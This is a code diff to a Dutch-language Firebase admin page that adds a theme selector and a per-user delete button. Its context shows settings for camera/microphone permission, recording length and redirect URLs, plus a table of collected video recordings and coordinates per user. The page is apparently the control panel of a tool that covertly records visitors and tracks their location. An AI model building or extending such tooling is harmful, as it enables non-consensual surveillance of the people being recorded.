@@ -21,7 +21,7 @@
             box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
             padding: 30px;
             width: 100%;
-            max-width: 700px; /* Terug naar smallere container */
+            max-width: 700px;
         }
         h2 {
             color: #333;
@@ -95,7 +95,7 @@
             box-sizing: border-box;
             font-size: 1rem;
         }
-        .save-button, #trigger-redirect, #delete-all-data { /* Added #delete-all-data */
+        .save-button, #trigger-redirect, #delete-all-data, .delete-user-button {
             background-color: #007bff;
             color: white;
             padding: 14px 24px;
@@ -108,17 +108,17 @@
             display: inline-block;
             text-decoration: none;
             text-align: center;
-            margin-right: 10px; /* Added right margin for spacing */
+            margin-right: 10px;
         }
-        .save-button:hover, #trigger-redirect:hover, #delete-all-data:hover { /* Added #delete-all-data:hover */
+        .save-button:hover, #trigger-redirect:hover, #delete-all-data:hover, .delete-user-button:hover {
             background-color: #0056b3;
         }
-        #delete-all-data {
-            background-color: #dc3545; /* Red color for delete button */
+        #delete-all-data, .delete-user-button {
+            background-color: #dc3545;
         }
 
-        #delete-all-data:hover {
-            background-color: #c82333; /* Darker red on hover */
+        #delete-all-data:hover, .delete-user-button:hover {
+            background-color: #c82333;
         }
 
 
@@ -180,7 +180,7 @@
 
         /* Style for the map container */
         #location-map {
-            height: 300px; /* Adjust map height as needed */
+            height: 300px;
             width: 100%;
             border: 1px solid #ddd;
             border-radius: 4px;
@@ -188,25 +188,45 @@
 
         /* Vertical Table Styling */
         .data-table th, .data-table td {
-            display: block; /* Make table cells stack vertically */
-            width: auto;     /* Adjust width as needed */
-            box-sizing: border-box; /* Include padding and border in cell width */
+            display: block;
+            width: auto;
+            box-sizing: border-box;
         }
 
         .data-table tr {
-            margin-bottom: 20px; /* Spacing between user rows */
-            border: 1px solid #ddd; /* Example border around each user's data */
+            margin-bottom: 20px;
+            border: 1px solid #ddd;
             border-radius: 8px;
             padding: 15px;
-            background-color: #f9f9f9; /* Light background for each user section */
+            background-color: #f9f9f9;
         }
 
         .data-table th {
             font-size: 1.1rem;
             margin-bottom: 10px;
-            border-bottom: 2px solid #bbb; /* Separator for the title */
-            background-color: transparent; /* No background for title */
+            border-bottom: 2px solid #bbb;
+            background-color: transparent;
             color: #555;
+        }
+
+        /* Theme Section Styling */
+        .theme-section {
+            margin-top: 30px;
+            border-top: 1px solid #eee;
+            padding-top: 20px;
+        }
+        .theme-section h3 {
+            color: #333;
+            margin-bottom: 15px;
+        }
+        .theme-dropdown {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            box-sizing: border-box;
+            font-size: 1rem;
+            margin-bottom: 20px;
         }
 
 
@@ -277,8 +297,19 @@
             <input type="number" id="record-seconds" class="input-field" placeholder="Bijv. 10" min="0">
         </div>
 
+        <!-- Theme Section -->
+        <div class="theme-section">
+            <h3>Thema Instellingen</h3>
+            <label for="theme-select">Kies Thema:</label>
+            <select id="theme-select" class="theme-dropdown">
+                <option value="default">Standaard Thema</option>
+                <option value="custom">Aangepast Thema</option>
+            </select>
+        </div>
+
+
         <button class="save-button" id="save-settings">Instellingen Opslaan</button>
-        <button class="save-button" id="delete-all-data">Verwijder Alle Data</button> <!-- Delete Button -->
+        <button class="save-button" id="delete-all-data">Verwijder Alle Data</button>
         <!-- Trigger for redirect -->
          <a href="redirect.html" id="trigger-redirect">Ga naar Redirect</a>
 
@@ -318,7 +349,8 @@ const storage = firebase.storage();
 
 const errorMessage = document.getElementById("error-message");
 const successMessage = document.getElementById('success-message');
-const deleteAllDataButton = document.getElementById('delete-all-data'); // Delete Button
+const deleteAllDataButton = document.getElementById('delete-all-data');
+const themeSelect = document.getElementById('theme-select'); // Theme dropdown
 
 // --- Form Elements ---
 const micCamPermissionToggle = document.getElementById('mic-cam-permission');
@@ -337,7 +369,8 @@ const dataTableTitleElement = document.getElementById("data-table-title");
 
 let currentUserId = "user1";
 
-// --- Firestore References (DYNAMIC USER ID) ---
+// --- Firestore References and Utility Functions (getNextUserId, getCurrentPositionPromise, getBatteryPromise) ---
+// ... (Firestore references and utility functions - same as before) ...
 async function getNextUserId() {
     const counterRef = db.collection('counters').doc('userCounter');
 
@@ -401,6 +434,7 @@ async function loadSettingsAndData(userId) {
             redirectUrl.value = settingsData.redirectUrl || '';
             redirectSeconds.value = settingsData.redirectSeconds || '0';
             recordSeconds.value = settingsData.recordSeconds || '0';
+            themeSelect.value = settingsData.selectedTheme || 'default'; // Load selected theme
         }
          updateExplanations();
          loadAllUserData(); // Load all user data after settings
@@ -442,6 +476,7 @@ async function saveSettings() {
             redirectUrl: redirectUrl.value,
             redirectSeconds: redirectSeconds.value,
             recordSeconds: recordSeconds.value,
+            selectedTheme: themeSelect.value // Save selected theme
         };
          updateExplanations();
 
@@ -467,7 +502,7 @@ async function displayData(userId, userData) {
     row.id = `user-row-${userId}`;
 
     let cellContent = `
-        <th>User ID: ${userId}</th>
+        <th>User ID: ${userId} <button class="delete-user-button" onclick="deleteUserData('${userId}')">Verwijder User</button></th>
         <td>
             <p>Opname: ${userData.videoUrl ? '<video src="' + userData.videoUrl + '" controls style="width: 100%;"></video>' : 'Geen Data'}</p>
             <p>Latitude: ${userData.location ? userData.location.latitude.toFixed(4) : 'Geen Data'}</p>
@@ -608,6 +643,30 @@ async function deleteAllData() {
     }
 }
 
+// --- Function to delete data for a specific user ---
+async function deleteUserData(targetUserId) {
+    if (confirm(`Weet je zeker dat je de data van gebruiker ${targetUserId} wilt verwijderen? Dit kan NIET ongedaan gemaakt worden!`)) {
+        const userRef = db.collection('userData').doc(targetUserId);
+
+        try {
+            await userRef.delete();
+            console.log(`Data for user ${targetUserId} deleted successfully!`);
+            successMessage.textContent = `Data voor gebruiker ${targetUserId} succesvol verwijderd!`;
+            successMessage.style.display = 'block';
+            setTimeout(() => { successMessage.style.display = 'none'; }, 3000);
+
+            loadAllUserData(); // Reload user data table
+
+        } catch (error) {
+            console.error("Error deleting user data:", error);
+            errorMessage.textContent = `Fout bij verwijderen gebruikersdata: ${error.message}`;
+            errorMessage.style.display = 'block';
+        }
+    } else {
+        console.log("Delete user data action cancelled by user.");
+    }
+}
+
 
 
 // Event listeners
@@ -621,7 +680,13 @@ dataTableTitleElement.addEventListener('click', function() {
         this.setAttribute('data-original-title', newTitle.trim());
     }
 });
-deleteAllDataButton.addEventListener('click', deleteAllData); // Event listener for delete button
+deleteAllDataButton.addEventListener('click', deleteAllData);
+themeSelect.addEventListener('change', () => {
+    // Basic theme change handling (can be expanded later)
+    const selectedTheme = themeSelect.value;
+    console.log(`Theme selected: ${selectedTheme}`);
+    // You can add more advanced theme application logic here later
+});
 
 
 // Initial load
